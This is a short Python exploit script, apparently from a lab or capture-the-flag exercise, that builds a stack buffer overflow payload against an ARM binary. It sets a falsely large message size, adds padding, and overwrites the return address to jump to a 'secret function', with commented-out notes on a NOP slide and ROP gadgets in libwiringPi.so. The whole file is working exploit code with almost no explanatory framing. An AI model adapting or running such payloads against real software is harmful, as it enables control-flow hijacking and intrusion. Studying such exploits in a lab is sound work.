import struct
import sys
#nop_length = 50

# Normally message size will follow the payload size, but for an overflow
# we set this to a high value, enough to acommodate our ROP payload
#message_size = struct.pack("i", 0x00000004);
message_size = struct.pack("i", 0x00000442);

#nopslide = "\x90" * nop_length
padding = "AABBCCDDEEFFGGHH"

# The following jump will access the secret function within the binary itself.
jump = struct.pack("i", 0x00010844);

# Base address of VMA is always going to be 0x76F8E608 for libwiringPi.so
# Find gadgets at offset of that. THe following jump goes to base+0xa608
#jump = struct.pack("i", 0x76F8E608);

padding2 = "KKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ"

# print will print with a LF character. Write prints without
#print(message_size + padding)
sys.stdout.write(message_size + padding + jump + padding2)
